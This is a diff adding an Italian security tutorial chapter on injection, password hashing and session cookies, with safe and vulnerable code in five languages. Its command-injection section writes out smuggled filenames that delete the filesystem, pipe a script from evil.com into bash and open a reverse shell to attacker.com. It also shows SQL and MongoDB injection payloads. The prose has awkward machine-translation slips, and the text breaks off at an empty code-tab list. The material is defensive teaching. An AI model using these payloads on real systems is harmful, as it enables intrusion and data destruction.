@@ -1,0 +1,2402 @@
+---
+order: 17
+title: "Sicurezza del back-end"
+navTitle: "Sicurezza del back-end"
+summary: "Quasi ogni attacco comporta lo stesso errore: i dati di un utente vengono trattati come codice o come attendibili. Iniezione, memorizzazione delle password, cookie di sessione, limitazione della velocità, BOLA e BFLA, XSS e CSRF, intestazioni di sicurezza, OAuth/OIDC e TLS, ciascuno costruito a ritroso dall'attacco. Implementazioni funzionate in Go, Python, JavaScript, TypeScript e Java."
+readingTime: "2-3 ore"
+keywords:
+  - "security"
+  - "xss"
+  - "csrf"
+  - "sql"
+  - "injection"
+  - "cors"
+  - "csp"
+  - "hsts"
+  - "helmet"
+---
+Un riferimento dettagliato al backend
+
+La sicurezza non è una caratteristica a cui ti iscrivi alla fine, è una mentalità che porti in ogni riga di codice. Questo capitolo tratta le classi di attacco con maggiore impatto che un ingegnere di backend incontrerà: attacchi injection, autenticazione interrotta, autorizzazione interrotta, XSS, CSRF e configurazione errata, con i modelli mentali e il codice per prevenirli tutti.
+
+01
+
+## La mentalità della sicurezza: pensare come un attaccante
+
+> "Agli aggressori non interessa il framework o il linguaggio. Fanno solo una domanda: dove ha ipotizzato lo sviluppatore?"
+
+Ogni vulnerabilità significativa nella storia del software risale a uno sviluppatore che presume che qualcosa sia stato violato da un utente malintenzionato:
+
+- Supponendo che l'input proveniente dall'utente sia pulito e ben formato.
+- Supponendo che l'utente sia chi afferma di essere.
+- Supponendo che la richiesta provenga dal tuo front-end.
+- Supponendo che nessuno apra la scheda di rete del browser e modifichi i parametri.
+
+Questi presupposti sembrano ragionevoli sotto la pressione delle scadenze, pensi sempre al **percorso felice**. Gli aggressori sfruttano i _percorsi infelici_. Colpiscono ogni confine, modificano ogni input e cercano di indovinare ogni ipotesi che hai fatto.
+
+<Callout type="info">
+L'obiettivo di questo capitolo è renderti **paranoico**: in modo produttivo. Ogni volta che scrivi del codice, chiediti: _"Cosa potrebbe andare storto? Cosa sto dando per scontato? E se questa supposizione fosse sbagliata?"_
+</Callout>
+
+### La causa principale di quasi tutti gli attacchi
+
+La tua applicazione backend parla **più lingue contemporaneamente**: SQL nel database, HTML/JS nel browser, comandi shell nel sistema operativo. Ogni lingua ha la propria grammatica, i propri caratteri speciali, il proprio modo di separare i comandi dai dati.
+
+<Diagram caption="Fig 1: Your backend speaks multiple languages. Every boundary crossing is a potential injection point.">
+<svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="200" fill="var(--dg-paper)"></rect><defs><marker id="ma" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ink-2)"></path></marker><marker id="mb" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-accent)"></path></marker></defs><rect x="260" y="70" width="160" height="60" rx="10" fill="var(--dg-inverse)"></rect><text x="340" y="97" text-anchor="middle" fill="var(--dg-on-inverse)" font-family="var(--font-prose)" font-size="14" font-weight="700">Il tuo back-end</text><text x="340" y="116" text-anchor="middle" fill="var(--dg-on-inverse)" font-family="var(--font-ui)" font-size="11">parla più di 3 lingue</text><rect x="30" y="80" width="140" height="42" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="100" y="98" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Banca dati</text><text x="100" y="114" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-diagram-mono)" font-size="10">linguaggio: SQL</text><line x1="172" y1="101" x2="258" y2="101" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#ma)"></line><rect x="510" y="50" width="140" height="42" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="580" y="68" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Navigatore</text><text x="580" y="84" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-diagram-mono)" font-size="10">linguaggio: HTML/JS</text><line x1="422" y1="90" x2="508" y2="71" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#ma)"></line><rect x="510" y="110" width="140" height="42" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="580" y="128" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Sistema operativo/Shell</text><text x="580" y="144" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-diagram-mono)" font-size="10">linguaggio: conchiglia</text><line x1="422" y1="110" x2="508" y2="131" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#ma)"></line><text x="340" y="170" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Vulnerabilità: l'input dell'utente in una lingua si riversa in un'altra</text></svg>
+</Diagram>
+
+Gli attacchi injection si verificano quando i dati dell'utente (che risiedono in una lingua) si insinuano nel contesto di un'altra lingua e vengono interpretati come un _comando_ anziché come _dati_. Questo singolo approfondimento spiega SQL injection, command injection, XSS e altro ancora.
+
+02
+
+## Panoramica delle vulnerabilità
+
+Iniezione SQL
+
+L'input dell'utente si inserisce nella query SQL. L'aggressore può leggere tutti i dati, eliminare tabelle o eseguire comandi del sistema operativo tramite DB.
+
+Iniezione di comando
+
+L'input dell'utente si inserisce in un comando shell. L'attaccante può scappare `rm -rf /` o installa spyware sul tuo server.
+
+XSS
+
+Contenuti utente archiviati come HTML. Script dannosi vengono eseguiti nei browser di altri utenti, rubano sessioni, reindirizzano e eseguono phishing.
+
+Autenticazione interrotta
+
+Password in testo semplice, hashing debole, ID di sessione prevedibili, limiti di velocità mancanti, l'aggressore prende il controllo degli account.
+
+Autorizzazione interrotta (BOLA/BFLA)
+
+Controllo dell'autenticazione a livello di routing ma non a livello DB. L'utente A legge le fatture dell'utente B. Il membro accede all'API di amministrazione.
+
+CSRF/Configurazione errata
+
+Server trucco per l'invio di moduli tra siti. Segreti in Git, log di debug in produzione, flag di cookie errati.
+
+03
+
+## Iniezione SQL
+
+L'SQL injection è da decenni la vulnerabilità più distruttiva n. 1. Funziona perché gli sviluppatori creano query SQL tramite **concatenazione di stringhe**: inserendo l'input utente non elaborato direttamente nel modello di query.
+
+### L'attacco: passo dopo passo
+
+Considera una query di accesso creata per concatenazione:
+
+```sql title="Vulnerable, never do this"
+-- Template on server:
+SELECT * FROM users WHERE email = '' + userInput + ''
+
+-- Happy path (Alice logs in normally):
+SELECT * FROM users WHERE email = 'alice@gmail.com'
+-- Returns Alice's row 
+
+-- Attacker types:  ' OR '1'='1 --
+SELECT * FROM users WHERE email = '' OR '1'='1' --'
+-- Returns ALL users <- data leak
+
+-- Attacker types:  '; DROP TABLE users; --
+SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
+-- Deletes your entire users table
+```
+
+<Diagram caption="Fig 2: String concatenation confuses code and data. Parameterised queries separate them permanently.">
+<svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="200" fill="var(--dg-paper)"></rect><defs><marker id="sq1" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-accent)"></path></marker><marker id="sq2" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ok)"></path></marker></defs><rect x="20" y="60" width="160" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="100" y="85" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Ingresso dell'attaccante</text><text x="100" y="105" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="10">' OPPURE '1'='1 --</text><text x="100" y="122" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="10">'; Utenti DROP TABLE;--</text><line x1="182" y1="100" x2="240" y2="100" stroke="var(--dg-accent)" stroke-width="2" stroke-dasharray="5 3" marker-end="url(#sq1)"></line><text x="210" y="92" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">concatenazione di stringhe</text><rect x="242" y="60" width="160" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="322" y="85" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Modello SQL</text><text x="322" y="103" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="9">DOVE e-mail = '' O</text><text x="322" y="118" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="9">'1'='1' -- &lt;- codice!</text><text x="322" y="133" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">dati trattati come codice</text><line x1="404" y1="100" x2="460" y2="100" stroke="var(--dg-ok)" stroke-width="2" marker-end="url(#sq2)"></line><text x="432" y="92" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="10">parametrizzato</text><rect x="462" y="60" width="190" height="80" rx="8" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="557" y="85" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="12" font-weight="700">Parametrizzato</text><text x="557" y="103" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="9">DOVE e-mail = $1</text><text x="557" y="118" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="9">argomenti: [&quot;' OR '1'='1&quot;]</text><text x="557" y="133" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="10">trattati esclusivamente come stringhe</text></svg>
+</Diagram>
+
+### Come i caratteri SQL speciali abilitano l'attacco
+
+| Carattere | Significato in SQL | Come lo usa l'aggressore |
+| --------- | -------------------- | ---------------------------------------------------------- |
+| `'`       | Delimitatore di stringa | Chiude la stringa letterale esistente, sfugge al contesto dei dati |
+| `;`       | Separatore di istruzioni | Termina la query legittima; ne inizia uno nuovo dannoso |
+| `--`      | Riga commento | Commenta il resto della query originale (trailing `'`) |
+| `OR`      | Operatore logico | Crea una condizione sempre vera per ignorare i filtri WHERE |
+| `UNION`   | Combina i set di risultati | Estrae dati da altre tabelle (pagamenti, segreti) |
+
+### La soluzione: query parametrizzate
+
+Invece di creare una stringa con tutto messo insieme, invia **due cose separate** al database: (1) il modello di query con slot segnaposto, (2) i dati dell'utente come argomenti separati. Il driver del database garantisce che qualunque cosa entri in uno slot venga trattata come una stringa pura, mai come SQL eseguibile.
+
+Vai a Python JavaScript TypeScript Java
+
+il valore viaggia accanto alla query, mai al suo interno
+
+```go title="pgx parameterised query"
+//NEVER, string concatenation
+query := "SELECT * FROM users WHERE email = '" + userInput + "'"
+
+// ALWAYS, parameterised ($1 is the slot)
+row := db.QueryRow(ctx,
+    "SELECT id, name FROM users WHERE email = $1",
+    userInput,  // passed separately, treated purely as data
+)
+
+// With an ORM (GORM), parameterised automatically
+db.Where("email = ?", userInput).First(&user)
+```
+
+```python title="psycopg parameterised query"
+# NEVER, f-string interpolation
+query = f"SELECT * FROM users WHERE email = '{user_input}'"
+
+# ALWAYS, parameterised (%s is the SLOT, not Python formatting)
+cur.execute(
+    "SELECT id, name FROM users WHERE email = %s",
+    (user_input,),  # a TUPLE; the driver escapes it, injection is impossible
+)
+
+# The trailing comma matters: ("x") is a string, ("x",) is a one-tuple.
+# Forget it and psycopg raises, which is the good outcome.
+
+# With an ORM (SQLAlchemy), parameterised automatically
+session.query(User).filter(User.email == user_input).first()
+```
+
+```js title="node-postgres parameterised query"
+// NEVER, template literal. This is THE JavaScript version of the
+// mistake, and it is four characters away from the safe line below.
+const query = `SELECT * FROM users WHERE email = '${userInput}'`
+
+// ALWAYS, parameterised ($1 is the slot, values go in the array)
+const { rows } = await db.query(
+  'SELECT id, name FROM users WHERE email = $1',
+  [userInput], // passed separately, treated purely as data
+)
+
+// With an ORM (Prisma), parameterised automatically
+await prisma.user.findFirst({ where: { email: userInput } })
+```
+
+```ts title="node-postgres parameterised query"
+// TypeScript does not stop the injection on its own, and it is worth
+// being clear about that: both lines below type-check perfectly.
+const bad = `SELECT * FROM users WHERE email = '${userInput}'` // still a hole
+
+// What it CAN do is make the safe path the only ergonomic one. A tagged
+// template collects the interpolations as PARAMETERS rather than
+// splicing them into the string, so the natural-looking syntax is the
+// safe one. `sql` here is from a library such as postgres.js or slonik.
+const rows = await sql<User[]>`
+  SELECT id, name FROM users WHERE email = ${userInput}
+`
+// -> sent as: SELECT id, name FROM users WHERE email = $1, [userInput]
+
+// Plain pg, typed by the row shape rather than the query text:
+const { rows } = await db.query<User>(
+  'SELECT id, name FROM users WHERE email = $1',
+  [userInput],
+)
+```
+
+```java title="JdbcClient parameterised query"
+// NEVER, string concatenation
+String query = "SELECT * FROM users WHERE email = '" + userInput + "'";
+
+// ALWAYS, parameterised (? is the slot)
+Optional<User> user = db.sql("SELECT id, name FROM users WHERE email = ?")
+    .param(userInput) // passed separately, treated purely as data
+    .query(User.class)
+    .optional();
+
+// JPA: a NAMED parameter, same rule
+em.createQuery("SELECT u FROM User u WHERE u.email = :email", User.class)
+  .setParameter("email", userInput)
+  .getSingleResult();
+
+// The Java-specific trap: String.format looks tidier than concatenation
+// and is exactly as dangerous. There is no formatting that escapes SQL.
+//   String.format("SELECT * FROM users WHERE email = '%s'", userInput)
+```
+
+<Callout type="info">
+Ogni ORM moderno (GORM, SQLAlchemy, Prisma, Hibernate) utilizza query parametrizzate per impostazione predefinita. L’unico modo per essere vulnerabili oggi è aggirarli deliberatamente costruendo stringhe grezze. **Non farlo mai.**
+</Callout>
+
+### Rafforzamento aggiuntivo: autorizzazioni DB minime
+
+Anche se un'iniezione SQL ha esito positivo, è possibile limitare il raggio dell'esplosione. L'utente del database utilizzato dal tuo backend per connettersi deve avere solo le **autorizzazioni DML** (INSERT, UPDATE, DELETE, SELECT), mai le autorizzazioni DDL (DROP TABLE, CREATE TABLE, ALTER). Un hacker che riceve l'iniezione SQL non può eliminare le tue tabelle se l'utente del DB non può eseguire DDL.
+
+### Iniezione NoSQL (MongoDB)
+
+Le query MongoDB sono oggetti JSON, non stringhe SQL. Ma supportano gli _operatori_ (con il prefisso `$`) piace `$ne` (non uguale), `$gt`, `$exists`. Se passi il JSON non elaborato fornito dall'utente direttamente a una query, un utente malintenzionato può inserire questi operatori:
+
+```js title="MongoDB injection"
+//VULNERABLE: attacker sends {"$ne": null} as email
+db.users.find({ email: req.body.email })
+// Becomes: { email: { $ne: null } }  -> returns ALL users
+
+// FIX: validate that email is a plain string, not an object
+if (typeof req.body.email !== 'string') {
+  return res.status(400).json({ error: 'Invalid email' })
+}
+db.users.find({ email: req.body.email })
+```
+
+04
+
+## Iniezione di comando
+
+L'iniezione di comandi è l'iniezione SQL a livello di sistema operativo. A volte il tuo backend ha bisogno di chiamare programmi esterni (elaborazione di immagini con FFmpeg, compressione di file, generazione di PDF). Se crei il comando shell concatenando l'input dell'utente, un utente malintenzionato può inserire comandi shell nel tuo server.
+
+### L'attacco
+
+```bash title="vulnerable image resize"
+# User supplies the output filename. Attacker sends: "out.jpg; rm -rf /"
+ffmpeg -i input.jpg -vf scale=800:600 out.jpg; rm -rf /
+#                                       ^ ffmpeg done  ^ now this runs
+
+# Attacker can also use:
+# out.jpg && curl evil.com/malware.sh | bash    (install backdoor)
+# out.jpg & nc -e /bin/sh attacker.com 4444 &   (reverse shell in background)
+```
+
+Caratteri speciali della shell che consentono ciò:
+
+| Carattere | Significato della conchiglia | Uso dell'attacco |
+| --------- | ------------------------- | -------------------------------------- |
+| `;`       | Comandi separati | Esegui il secondo comando dopo il primo |
+| `&&`      | Esegui se il precedente ha avuto successo | Exploit a catena dopo comando legittimo |
+| `\|`      | Uscita tubo | Invia l'output al comando distruttivo |
+| `&`       | Esegui in background | Installa silenziosamente lo spyware persistente |
+| `$()`     | Sostituzione comando | Esegui il comando arbitrario in linea |
+
+### La soluzione: comando separato dagli argomenti
+
+Ogni linguaggio fornisce funzioni che accettano _comando_ e _argomenti_ come parametri separati. Questi passano gli argomenti direttamente al processo senza passare attraverso un interprete di shell, quindi i caratteri speciali non vengono mai interpretati.
+
+Vai a Python JavaScript TypeScript Java
+
+il comando e i suoi argomenti sono valori separati, quindi nessuna shell li analizza
+
+```go title="exec.Command, safe"
+import "os/exec"
+
+//VULNERABLE, passes through shell interpreter
+cmd := exec.Command("sh", "-c", "ffmpeg -i input.jpg -o "+userFilename)
+
+// SAFE, command and each argument are separate params
+// Shell never sees userFilename, it goes straight to the process
+cmd := exec.Command(
+    "ffmpeg",
+    "-i", "input.jpg",
+    "-vf", "scale=800:600",
+    userFilename,   // treated as a string argument, not shell code
+)
+output, err := cmd.Output()
+```
+
+```python title="subprocess, safe"
+import subprocess
+
+#VULNERABLE, shell=True sends everything through sh
+subprocess.run(f"ffmpeg -i input.jpg -o {user_filename}", shell=True)
+
+# SAFE, list form, shell=False (default)
+subprocess.run([
+    "ffmpeg", "-i", "input.jpg",
+    "-vf", "scale=800:600",
+    user_filename   # just a string, not interpreted
+], check=True)
+```
+
+```js title="execFile, safe"
+import { execFile } from 'node:child_process'
+import { promisify } from 'node:util'
+
+// VULNERABLE: exec() runs the string through /bin/sh
+import { exec } from 'node:child_process'
+exec(`ffmpeg -i input.jpg -o ${userFilename}`)
+
+// SAFE: execFile takes the program and an ARRAY of arguments.
+// No shell is spawned, so ; && $() and friends have no meaning.
+await promisify(execFile)('ffmpeg', [
+  '-i', 'input.jpg',
+  '-vf', 'scale=800:600',
+  userFilename, // treated as one argument, not shell code
+])
+
+// spawn() is the same rule. The one thing to never do is pass
+// `{ shell: true }`, which puts the shell right back in the path.
+```
+
+```ts title="execFile, safe"
+import { execFile } from 'node:child_process'
+import { promisify } from 'node:util'
+
+const run = promisify(execFile)
+
+// Types cannot tell a safe string from a dangerous one, but they CAN
+// make the shape of the safe call the only one available. A function
+// that takes `args: string[]` simply has nowhere to put a shell string.
+async function resize(inputPath: string, outputPath: string): Promise<void> {
+  await run('ffmpeg', [
+    '-i', inputPath,
+    '-vf', 'scale=800:600',
+    outputPath,
+  ])
+}
+
+// Worth saying plainly: argument separation stops SHELL injection, not
+// ARGUMENT injection. A filename beginning with "-" is still read by
+// ffmpeg as a flag. Validate the value as well as passing it safely:
+if (!/^[\w.-]+$/.test(userFilename) || userFilename.startsWith('-')) {
+  throw new Error('invalid filename')
+}
+```
+
+```java title="ProcessBuilder, safe"
+// VULNERABLE: the single-String form of Runtime.exec, and worse, any
+// version that hands the string to a shell.
+Runtime.getRuntime().exec("ffmpeg -i input.jpg -o " + userFilename);
+
+// SAFE: ProcessBuilder takes the program and each argument separately.
+// Java never invokes a shell here, so shell metacharacters are inert.
+ProcessBuilder pb = new ProcessBuilder(
+    "ffmpeg",
+    "-i", "input.jpg",
+    "-vf", "scale=800:600",
+    userFilename   // one argument, not shell code
+);
+pb.redirectErrorStream(true);
+Process process = pb.start();
+
+// Always consume the output stream and wait with a TIMEOUT. A process
+// whose pipe buffer fills up blocks forever, and waitFor() with no
+// timeout then hangs the calling thread for good.
+String output = new String(process.getInputStream().readAllBytes());
+if (!process.waitFor(30, TimeUnit.SECONDS)) {
+    process.destroyForcibly();
+}
+```
+
+<Callout type="info">
+La regola: **non passare mai l'input dell'utente in una stringa interpretata dalla shell.** Ogni volta che stai costruendo una stringa che verrà eseguita da un altro sistema e include l'input dell'utente, fermati e trova l'alternativa parametrizzata. Esiste quasi sempre.
+</Callout>
+
+05
+
+## Archiviazione delle password: le tre evoluzioni
+
+I database vengono violati ogni giorno. Quando lo fanno, il modo in cui hai memorizzato le password determina se le vite dei tuoi utenti verranno distrutte o meno.
+
+<Diagram caption="Fig 3: Password storage evolution. Only option (3) is acceptable in production.">
+<svg viewBox="0 0 700 160" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="700" height="160" fill="var(--dg-paper)"></rect><rect x="20" y="30" width="180" height="100" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="110" y="56" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">(1) Testo semplice</text><text x="110" y="76" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="11">pass_col = &quot;12345&quot;</text><text x="110" y="96" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">Breccia -&gt; Pwn istantaneo</text><text x="110" y="114" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">Gli sviluppatori possono vedere tutte le password</text><rect x="220" y="30" width="180" height="100" rx="8" fill="var(--dg-warn-surface)" stroke="var(--dg-warn)"></rect><text x="310" y="56" text-anchor="middle" fill="var(--dg-warn)" font-family="var(--font-ui)" font-size="12" font-weight="700">(2) Solo hashing </text><text x="310" y="76" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="11">SHA256(&quot;12345&quot;)</text><text x="310" y="96" text-anchor="middle" fill="var(--dg-warn)" font-family="var(--font-ui)" font-size="10">Vulnerabile all'arcobaleno</text><text x="310" y="114" text-anchor="middle" fill="var(--dg-warn)" font-family="var(--font-ui)" font-size="10">attacchi al tavolo</text><rect x="420" y="30" width="260" height="100" rx="8" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="550" y="56" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="12" font-weight="700">(3) Hashish lento + sale </text><text x="550" y="76" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="10">argon2id(&quot;12345&quot; + salt_u14)</text><text x="550" y="96" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="10">Tavoli arcobaleno inutili</text><text x="550" y="114" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="10">Forza bruta: secoli, non giorni</text></svg>
+</Diagram>
+
+### Perché il testo normale fallisce
+
+Ogni violazione del database espone immediatamente tutte le password. Peggio ancora: oltre il 70% degli utenti riutilizza le password su più siti, quindi una violazione consegna agli aggressori le chiavi di account di posta elettronica, bancari e di social media che non hanno nemmeno preso di mira.
+
+### Perché l'hashing da solo non è sufficiente
+
+Gli aggressori precalcolano le **tabelle arcobaleno**: enormi tabelle di ricerca che mappano le password comuni (come "123456", "password", "qwerty") ai loro hash. Se il tuo hash corrisponde a una voce della tabella arcobaleno, effettuano immediatamente la ricerca inversa del testo in chiaro. Una GPU può calcolare _miliardi di hash SHA-256 al secondo_.
+
+### Salatura: sconfiggere le tavole arcobaleno
+
+Un **sal** è una stringa crittograficamente casuale generata in modo univoco per ciascun utente. Concatena il salt con la password prima dell'hashing. Poiché il salt di ciascun utente è diverso, anche due utenti con la stessa password producono hash completamente diversi. Le tabelle arcobaleno diventano inutili, avrebbero bisogno di una nuova tabella per utente.
+
+### Hashing lento: sconfiggere la forza bruta
+
+Le funzioni hash generiche (SHA-256, MD5) sono progettate per essere _veloci_. Una GPU può fare miliardi al secondo. Gli algoritmi di hashing della password (bcrypt, scrypt, **Argon2id**) sono deliberatamente _lenti_ tramite un **fattore costo/lavoro** configurabile. A 400 ms per hash:
+
+- Accesso utente legittimo: 400 ms, impercettibile, assolutamente soddisfacente.
+- Forza bruta dell'attaccante offline: 400 ms per tentativo -&gt; \~2,5 tentativi/secondo invece di miliardi -&gt; il cracking richiede _secoli_.
+
+<Callout type="info">
+**Standard del settore odierno:** utilizzo `Argon2id` (vincitore del concorso Password Hashing). Fallback: bcrypt con fattore di costo &gt;=12. Non utilizzare mai SHA-256, MD5 o SHA-1 per le password.
+</Callout>
+
+Vai a Python JavaScript TypeScript Java
+
+un sale casuale per password, un hash deliberatamente lento, un confronto a tempo costante
+
+```go title="Argon2id / golang.org/x/crypto"
+import (
+    "crypto/rand"
+    "golang.org/x/crypto/argon2"
+    "encoding/base64"
+)
+
+func HashPassword(password string) (string, error) {
+    // Generate cryptographically random 16-byte salt
+    salt := make([]byte, 16)
+    rand.Read(salt)
+
+    // Argon2id params: time=1, memory=64MB, threads=4, keyLen=32
+    hash := argon2.IDKey([]byte(password), salt, 1, 64*1024, 4, 32)
+
+    // Store: $argon2id$salt$hash (both needed to verify)
+    encoded := base64.RawStdEncoding.EncodeToString(salt) +
+               "$" + base64.RawStdEncoding.EncodeToString(hash)
+    return encoded, nil
+}
+
+func VerifyPassword(password, stored string) bool {
+    // Re-hash with stored salt, compare, never compare raw hashes with ==
+    parts := strings.Split(stored, "$")
+    salt, _ := base64.RawStdEncoding.DecodeString(parts[0])
+    newHash := argon2.IDKey([]byte(password), salt, 1, 64*1024, 4, 32)
+    return subtle.ConstantTimeCompare(newHash,
+        mustDecode(parts[1])) == 1
+}
+```
+
+```python title="Argon2id / argon2-cffi"
+from argon2 import PasswordHasher
+from argon2.exceptions import VerifyMismatchError
+
+# The library owns the parameters, the salt and the encoding. That is
+# the point: every one of those is a chance to get it wrong by hand.
+ph = PasswordHasher(
+    time_cost=1,        # iterations
+    memory_cost=64*1024, # 64 MB
+    parallelism=4,
+    hash_len=32,
+)
+
+
+def hash_password(password: str) -> str:
+    # A random salt is generated internally and embedded in the output
+    # string, so there is nothing separate to store.
+    return ph.hash(password)  # -> $argon2id$v=19$m=65536,t=1,p=4$...
+
+
+def verify_password(password: str, stored: str) -> bool:
+    try:
+        ph.verify(stored, password)  # constant-time internally
+    except VerifyMismatchError:
+        return False
+
+    # Bonus: if the stored hash used weaker parameters than today's
+    # settings, transparently upgrade it on successful login.
+    if ph.check_needs_rehash(stored):
+        save_new_hash(ph.hash(password))
+
+    return True
+```
+
+```js title="Argon2id / node:crypto"
+import { randomBytes, scrypt, timingSafeEqual } from 'node:crypto'
+import { promisify } from 'node:util'
+import argon2 from 'argon2'
+
+// Argon2id, via the argon2 package. Salt, parameters and encoding are
+// all handled for you and embedded in the returned string.
+export async function hashPassword(password) {
+  return argon2.hash(password, {
+    type: argon2.argon2id,
+    timeCost: 1,
+    memoryCost: 64 * 1024, // 64 MB
+    parallelism: 4,
+  })
+}
+
+export async function verifyPassword(password, stored) {
+  // Constant-time internally; never compare hashes with ===
+  return argon2.verify(stored, password)
+}
+
+// If you cannot add a dependency, scrypt is in the standard library and
+// is an acceptable second choice. bcrypt is the third. What is NOT
+// acceptable is any general-purpose hash, crypto.createHash('sha256')
+// is fast by design, which is precisely the wrong property here.
+```
+
+```ts title="Argon2id / argon2"
+import argon2 from 'argon2'
+
+// A branded type is a small trick with a real payoff: a PasswordHash is
+// no longer interchangeable with any other string, so a function that
+// stores hashes cannot be handed a plaintext password by accident, and
+// a log statement that takes a `string` will not silently accept one.
+type PasswordHash = string & { readonly __brand: 'PasswordHash' }
+
+const OPTIONS = {
+  type: argon2.argon2id,
+  timeCost: 1,
+  memoryCost: 64 * 1024, // 64 MB
+  parallelism: 4,
+} as const
+
+export async function hashPassword(password: string): Promise<PasswordHash> {
+  return (await argon2.hash(password, OPTIONS)) as PasswordHash
+}
+
+export async function verifyPassword(
+  password: string,
+  stored: PasswordHash,
+): Promise<boolean> {
+  try {
+    return await argon2.verify(stored, password) // constant-time internally
+  } catch {
+    return false // a malformed stored hash must not throw into the handler
+  }
+}
+```
+
+```java title="Argon2id / Spring Security"
+// Spring Security ships the encoder, and using it rather than calling a
+// hashing library directly buys one specific thing: DelegatingPasswordEncoder
+// prefixes each hash with the algorithm that produced it, so you can
+// migrate from bcrypt to Argon2 without a flag day.
+@Bean
+PasswordEncoder passwordEncoder() {
+    // saltLength=16, hashLength=32, parallelism=4, memory=64MB, iterations=1
+    return new Argon2PasswordEncoder(16, 32, 4, 64 * 1024, 1);
+}
+
+@Service
+public class PasswordService {
+    private final PasswordEncoder encoder;
+
+    public String hashPassword(String password) {
+        // The random salt is generated internally and embedded in the output
+        return encoder.encode(password);
+    }
+
+    public boolean verifyPassword(String password, String stored) {
+        // Constant-time internally; never use String.equals on hashes,
+        // it short-circuits on the first differing byte and leaks timing.
+        return encoder.matches(password, stored);
+    }
+}
+
+// Argon2PasswordEncoder needs BouncyCastle on the classpath:
+//   implementation 'org.bouncycastle:bcprov-jdk18on'
+```
+
+06
+
+## Sessioni, cookie e flag critici
+
+Dopo che un utente si è autenticato, è necessario ricordarlo tra le richieste. Ciò avviene tramite una **sessione**: un identificatore casuale memorizzato sul lato server, collegato ai dati dell'utente, inviato al browser come cookie.
+
+### Il flusso della sessione
+
+1. L'utente invia e-mail + password.
+2. Il server verifica la password (corrispondenza hash argon2id).
+3. Il server genera un ID di sessione **crittograficamente casuale** da 128-256 bit.
+4. Il server memorizza l'ID sessione in Redis/DB con i metadati dell'utente (ID utente, IP, agente utente, scadenza, creato\_at).
+5. Il server invia l'ID di sessione al browser in un cookie con rigorosi flag di sicurezza.
+6. Ogni richiesta successiva: il browser invia il cookie -&gt; il server cerca l'ID di sessione -&gt; identifica l'utente.
+
+### I tre flag di cookie critici
+
+| Bandiera | Valore | Cosa fa | Senza di esso |
+| ------------ | ----------------- | ---------------------------------------- | ------------------------------------------------- |
+| **Solo Http** | `true`            | JS non può leggere questo cookie | XSS ruba l'ID di sessione tramite `document.cookie`       |
+| **Sicuro** | `true`            | Cookie inviato solo tramite HTTPS | Sessione rubata da un intercettatore Wi-Fi o da Wireshark |
+| **StessoSito** | `Strict` o `Lax` | Cookie non inviato nelle richieste multiorigine | Gli attacchi CSRF possono utilizzare il tuo cookie da evil.com |
+
+Vai a Python JavaScript TypeScript Java
+
